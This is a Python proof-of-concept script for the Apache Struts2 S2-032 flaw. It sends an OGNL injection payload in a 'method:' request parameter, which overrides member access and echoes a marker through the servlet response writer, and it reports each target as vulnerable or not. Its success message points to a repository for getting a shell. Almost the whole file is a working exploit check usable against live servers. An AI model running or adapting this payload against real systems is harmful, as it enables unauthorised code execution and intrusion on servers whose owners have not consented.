#!/usr/bin/python3
#-*- coding:utf-8 -*-

import requests

TM = 10


def poc(url):
    poc='032'
    payload = {'method:#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,#writer=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#writer.println(#parameters.poc[0]),#writer.flush(),#writer.close': '', 'poc': poc}
    try:
        r = requests.get(url, params=payload, timeout=TM)
    except:
        print ("[-] Target "+url+" Not Struts2-032 Vuln!!! Good Luck\n")
        return False

    if poc in r.text:
        print("[+] Target "+url+" Find Struts2-032 Vuln!!! \n[+] GetShell:https://github.com/zhzyker/exphub/tree/master/struts2\n")
        return True
    else:
        print("[-] Target "+url+" Not Struts2-032 Vuln!!! Good Luck\n")
        return False


if __name__=='__main__':
    import datetime

    start = datetime.datetime.now()
    url = "http://127.0.0.1:8080"
    poc(url)
    end = datetime.datetime.now()
    print(end - start)
